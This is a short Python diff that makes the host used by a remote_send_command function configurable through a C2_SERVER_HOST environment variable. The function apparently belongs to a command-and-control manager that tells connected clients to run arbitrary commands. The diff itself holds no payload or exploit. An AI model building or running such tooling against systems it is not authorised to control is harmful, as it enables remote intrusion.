@@ -29,11 +29,13 @@ async def remote_get_connections(host: str = None, port: int = 9100) -> ManagerR
         return ManagerResponse(success=False, error=ve.json())
 
 
-async def remote_send_command(conn_id: str, command: str, host: str = "127.0.0.1", port: int = 9100, _parse_data=False) -> ManagerResponse:
+async def remote_send_command(conn_id: str, command: str, host: str = None, port: int = 9100, _parse_data=False) -> ManagerResponse:
     """
     Instruct a specific connection to run 'command'.
     Return a ManagerResponse object (with success/data/error).
     """
+    if host is None:
+        host = getenv("C2_SERVER_HOST", "127.0.0.1")
     req = {
         "action": "send_command",
         "conn_id": conn_id,
